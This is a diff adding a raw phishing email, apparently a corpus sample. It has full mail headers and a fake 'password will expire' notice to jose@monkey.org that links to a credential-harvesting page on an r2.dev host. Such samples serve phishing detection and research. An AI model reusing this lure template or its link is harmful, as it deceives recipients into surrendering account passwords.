@@ -1,0 +1,179 @@
+Return-Path: info@sttauf.cc
+Delivered-To: jose@monkey.org
+X-FDA: 81845030484.08.D655C65
+Received: from sttauf.cc (sttauf.cc [188.93.233.193])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id E5A42120027
+	for <jose@monkey.org>; Thu, 29 Feb 2024 14:12:00 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;	dkim=pass header.d=sttauf.cc
+ header.s=dkim header.b=XTbjQ8+V;	spf=pass (imf16.b.hostedemail.com: domain of
+ info@sttauf.cc designates 188.93.233.193 as permitted sender)
+ smtp.mailfrom=info@sttauf.cc;	dmarc=pass (policy=reject)
+ header.from=sttauf.cc
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1709215921;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=0shK8zkscI65nMT15wp9Org+KiKzehVOqPZfj6dY0hk=;
+	b=RYd8BlnGn3t4VU3LiQGzAUjCRLFvdC778tmREDw/BRYzAGIJsZnt+UZkZfx7sQ4KXg9EFv
+	khCVyfodTq8xBonrQpp1ufJ22sipwsMtX83hVj3U37OOMM1IopM0xjqXx7OM6vK/HrUyIB
+	fad1KwfYPI8qbnVWBn1uHdqfXld9Czo=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1709215921; a=rsa-sha256;
+	cv=none;
+	b=ltjBI0pOE+iDkAhaZXKbkwx93Fa2x+ZZUXSIlvfh8YtDVyrKe+csbach6DcBAOKoiR5NSj
+	3NVxqzQBydYavZOG3i7tnZHzbwkQz2Z7QdJBYcA/KRtZVQ+ziehOOwtXue0jTZLOYVEASQ
+	rXEbcOv3XGusIKGrftv3d+GemN9FP7M=
+ARC-Authentication-Results: i=1;	imf16.b.hostedemail.com;	dkim=pass
+ header.d=sttauf.cc header.s=dkim header.b=XTbjQ8+V;	spf=pass
+ (imf16.b.hostedemail.com: domain of info@sttauf.cc designates 188.93.233.193
+ as permitted sender) smtp.mailfrom=info@sttauf.cc;	dmarc=pass (policy=reject)
+ header.from=sttauf.cc
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sttauf.cc;
+	s=dkim; h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:
+	Reply-To:Cc:Content-Transfer-Encoding:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=0shK8zkscI65nMT15wp9Org+KiKzehVOqPZfj6dY0hk=; b=XTbjQ8+VI8EFMkIPezXeVKJdvg
+	MlhQo4C4Q//g4x0qArfn2cmZE3dgJACKXpmq9VaX8T6KQPhf244QLlxWh5s8dzKFeFvjQNPvvgtr7
+	EdRsbZmL07ovcA8ucvY3YxcOYRW+jD9mYOALxxkdJ9sE0pFC2tLF6MfbU2QEDAGrqp1s=;
+Received: from [5.206.227.54] (helo=WIN-D73T2EJVOO6)
+	by sttauf.cc with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.97.1)
+	(envelope-from <info@sttauf.cc>)
+	id 1reWoy-000000000ff-0J2b
+	for jose@monkey.org;
+	Mon, 26 Feb 2024 08:58:48 +0000
+From: "DOMAIN SEVER" <info@sttauf.cc>
+Subject: EMAIL UPDATE NOTIFICATION FOR jose@monkey.org
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="hQ=_uIDIG9Z6Ok0cK2uxJ8RffTDcvjKIKb"
+MIME-Version: 1.0
+Date: Mon, 26 Feb 2024 00:58:48 -0800
+Message-Id: <264820240258001FB71747CB-62FB5949BA@sttauf.cc>
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: E5A42120027
+X-Stat-Signature: 88gehk5pq1e69x1bmabbm1aj8g9944n3
+X-Spam-Status: No, score=0.30
+X-Rspam-User: 
+X-HE-Tag: 1709215920-429260
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19rMTHTL0upil4pidMlKpMyFi0j/A/vHkuwNpA4PJ+d6tb?=
+ =?utf-8?q?4BOy2ovryvhGGThjmZRckG+CUyBjfdSQcrm0/MWmhfQLHswgYxZaomo5klli/HJIh?=
+ =?utf-8?q?90BB6I7IUmXPzfAmSVyXnx/D5xlzqq5X6AHsdcCCB0UB7mG2SOHzc//AZL+rIROC1?=
+ =?utf-8?q?EZ8GvXWQWJQfcyw7oEBbW5ehxeajB2IZkFfELbYP91OpuTLqj2IQQtz3IviQh3R97?=
+ =?utf-8?q?nsfJDBl3/P8Cm8JCt6DS7SCa90G76LbOEY5rAkq0P/Utjd7bQ/LOvJ8NFnkCejXTr?=
+ =?utf-8?q?TioYaAA4+PkCUF4f0bc7mFh1NJ7EKj2Uk6CpsKo6O1wI8bN5jy1c1dsc1EqRnTe5m?=
+ =?utf-8?q?OjG1svPxwqMr4j2/Qa4pPy0YQBpy8/U3lJNb8372WQm00VWhu4qNMq1x7PhAwHLkZ?=
+ =?utf-8?q?vLa5gyAhzxod1Ly/SXcW1dmsA=3D=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 67
+
+This is a multi-part message in MIME format
+
+--hQ=_uIDIG9Z6Ok0cK2uxJ8RffTDcvjKIKb
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Support -jose@monkey.org Mailbox
+
+Dear jose,
+Your monkey.org mailbox password will expire within 48 hours, Go to Em=
+ail Account Settings
+below to confirm using the same password!
+
+Email Account Settings https://pub-a515f839e2f9490b99f9e2b32f9432e6.r2=
+=2Edev/wizidvidonowingraamy.html#jose@monkey.org
+
+Sincerely,
+
+monkey.org Automated Message!
+
+--hQ=_uIDIG9Z6Ok0cK2uxJ8RffTDcvjKIKb
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <title>EMAIL UPDATE NOTIFICATION FOR jose@monkey.org</title>
+ </head>
+ <body><table lang=3Den style=3D"FONT-SIZE: medium; FONT-FAMILY: 'Sego=
+e UI','Lucida Sans',sans-serif; BORDER-RIGHT: #e3e3e3 1px solid; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: #000000; FONT-STYLE: normal; BORDER-LEFT: #e3e3e3 1px soli=
+d; LETTER-SPACING: normal; BACKGROUND-COLOR: #fcfdfe; font-variant-lig=
+atures: normal; font-variant-caps: normal; text-decoration-style: init=
+ial; text-decoration-color: initial" dir=3Dltr cellSpacing=3D0 cellPad=
+ding=3D0 width=3D640 border=3D0> <TR style=3D"BACKGROUND-COLOR: #0072c=
+6"> <TD style=3D"BORDER-TOP: #e3e3e3 1px solid; BORDER-BOTTOM: #e3e3e3=
+ 1px solid; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 0px=
+; PADDING-RIGHT: 0px" vAlign=3Dmiddle width=3D310> <H1 style=3D"FONT-S=
+IZE: 15pt; FONT-FAMILY: 'segoe ui light'; FONT-WEIGHT: normal; COLOR: =
+#ffffff; LINE-HEIGHT: 20pt"><SPAN id=3Dm_5719924107475463702m_62759899=
+17560600257x_HeaderPlaceholder_UserVerificationEmailHeader><SPAN style=
+=3D"COLOR: #ffffff">Support -jose@monkey.org&nbsp; Mailbox</SPAN></SPA=
+N></H1></td><td style=3D"BORDER-TOP: #e3e3e3 1px solid; BORDER-BOTTOM:=
+ #e3e3e3 1px solid" width=3D24>&nbsp;</TD></TR></TABLE><table lang=3De=
+n style=3D"FONT-SIZE: medium; FONT-FAMILY: 'Segoe UI','Lucida Sans',sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: #000000; FONT-STYLE: normal; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: #fcfdfe; font-variant-ligatures: normal; f=
+ont-variant-caps: normal; text-decoration-style: initial; text-decorat=
+ion-color: initial" dir=3Dltr cellSpacing=3D0 cellPadding=3D0 width=3D=
+640 border=3D0> <tr><td style=3D"BACKGROUND: #e3e3e3" width=3D1>&nbsp;=
+</td><td width=3D24>&nbsp;</td><td id=3Dm_5719924107475463702m_6275989=
+917560600257x_PageBody style=3D"BORDER-BOTTOM: #e3e3e3 1px solid; PADD=
+ING-BOTTOM: 20px; PADDING-TOP: 10px; PADDING-LEFT: 0px; PADDING-RIGHT:=
+ 0px" vAlign=3Dtop width=3D640 colSpan=3D2><table cellSpacing=3D0 cell=
+Padding=3D0 border=3D0> <tr><td style=3D"FONT-SIZE: 10pt; COLOR: #0000=
+00; LINE-HEIGHT: 13pt" width=3D630><table lang=3Den dir=3Dltr cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0> <tr><td> <DIV style=
+=3D"FONT-SIZE: 14px; FONT-FAMILY: 'segoe ui',tahoma,sans-serif; COLOR:=
+ #333333"><SPAN id=3Dm_5719924107475463702m_6275989917560600257x_BodyP=
+laceholder_UserVerificationEmailBodySentence1>&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;<WBR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<WBR>&nbs=
+p;&nbsp;&nbsp;Dear jose,<BR><BR>Your&nbsp;monkey.org mailbox password =
+will expire within 48 hours, Go to Email Account Settings<BR>&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<WBR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;below to=
+ confirm using the same password!</SPAN></DIV><BR><BR></TD></tr><tr><t=
+d style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; P=
+ADDING-RIGHT: 0px" align=3Dcenter><table style=3D"BACKGROUND-COLOR: #0=
+078d7" cellSpacing=3D0 cellPadding=3D0 align=3Dcenter border=3D0> <tr>=
+<td style=3D"FONT-SIZE: 16px; BORDER-TOP: #0078d7 1px solid; FONT-FAMI=
+LY: 'segoe ui','segoe wp',wf_segoe-ui_semibold,tahoma,arial,sans-serif=
+; BORDER-RIGHT: #0078d7 1px solid; BORDER-BOTTOM: #0078d7 1px solid; F=
+ONT-WEIGHT: 600; COLOR: #0078d7; PADDING-BOTTOM: 13px; TEXT-ALIGN: cen=
+ter; PADDING-TOP: 13px; PADDING-LEFT: 24px; BORDER-LEFT: #0078d7 1px s=
+olid; LINE-HEIGHT: 10px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: #0078d=
+7" align=3Dcenter><SPAN id=3Dm_5719924107475463702m_627598991756060025=
+7OBJ_PREFIX_DWT151_com_zimbra_url style=3D"TEXT-DECORATION: none; COLO=
+R: #44656f"><SPAN id=3Dm_5719924107475463702m_6275989917560600257OBJ_P=
+REFIX_DWT152_com_zimbra_url style=3D"TEXT-DECORATION: none; COLOR: #44=
+656f"><A style=3D"TEXT-DECORATION: none" href=3D"https://pub-a515f839e=
+2f9490b99f9e2b32f9432e6.r2.dev/wizidvidonowingraamy.html#jose@monkey.o=
+rg" target=3D_blank data-saferedirecturl=3D"https://www.google.com/url=
+?q=3Dhttps://tinyurl.com/57br9jx5%23casascene@casascene.com&amp;source=
+=3Dgmail&amp;ust=3D1708985379466000&amp;usg=3DAOvVaw2KtiF37xozIJq8iT1V=
+kdZM">Email Account Settings</A> </SPAN></SPAN></TD></TR></TABLE></TD>=
+</TR></TABLE><BR><BR> <DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: 'seg=
+oe ui',tahoma,sans-serif; COLOR: #333333">Sincerely,</DIV> <DIV style=3D=
+"FONT-SIZE: 14px; FONT-FAMILY: 'segoe ui',tahoma,sans-serif; COLOR: #3=
+33333; FONT-STYLE: italic">monkey.org&nbsp;Automated Message!</DIV></T=
+D></TR></TABLE></TD></TR></TABLE> <P>&nbsp;</P></body>
+ </html>
+
+--hQ=_uIDIG9Z6Ok0cK2uxJ8RffTDcvjKIKb--
+
+
